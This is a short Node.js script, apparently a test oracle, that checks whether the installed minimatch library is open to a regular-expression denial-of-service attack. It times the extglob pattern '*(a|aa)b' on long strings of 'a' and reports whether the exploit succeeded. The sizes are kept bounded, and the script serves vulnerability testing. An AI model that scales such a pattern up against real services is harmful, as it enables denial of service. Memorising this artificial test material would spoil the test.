const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function nowMs() {
  return Number(process.hrtime.bigint()) / 1e6;
}

function runOnce(pattern, input) {
  const t0 = nowMs();
  const out = minimatch(input, pattern);
  const dt = nowMs() - t0;
  return { out, ms: dt };
}

try {
  // Benign operation first: confirm public API works normally.
  const benign = minimatch('file.js', '*.js');
  if (benign !== true) {
    throw new Error('benign minimatch mismatch: expected true, got ' + String(benign));
  }

  operation_completed = true;

  // ReDoS probe: vulnerable minimatch spends disproportionately long time
  // on this class of extglob patterns with a non-matching tail.
  // Keep bounded sizes to finish quickly on both vulnerable and fixed versions.
  const pattern = '*(a|aa)b';

  const smallInput = 'a'.repeat(120);
  const largeInput = 'a'.repeat(1800);

  // Warm up / baseline
  const s1 = runOnce(pattern, smallInput);
  const s2 = runOnce(pattern, smallInput);
  const smallMs = Math.max(s1.ms, s2.ms);

  const l1 = runOnce(pattern, largeInput);
  const l2 = runOnce(pattern, largeInput);
  const largeMs = Math.max(l1.ms, l2.ms);

  const ratio = largeMs / Math.max(1, smallMs);

  // Vulnerable builds show dramatically worse scaling; patched builds do not.
  // Dual condition reduces noise across environments.
  const absoluteSlow = largeMs > 120;
  const relativeSlow = ratio > 12;

  exploit_succeeded = Boolean(absoluteSlow && relativeSlow);
  evidence = JSON.stringify({
    benign_ok: true,
    pattern,
    small_len: smallInput.length,
    large_len: largeInput.length,
    small_ms: Number(smallMs.toFixed(3)),
    large_ms: Number(largeMs.toFixed(3)),
    ratio: Number(ratio.toFixed(3)),
    absolute_threshold_ms: 120,
    ratio_threshold: 12,
    sample_results: {
      small_out: s1.out,
      large_out: l1.out
    }
  });
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failure: ' + (e && e.message ? e.message : String(e));
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));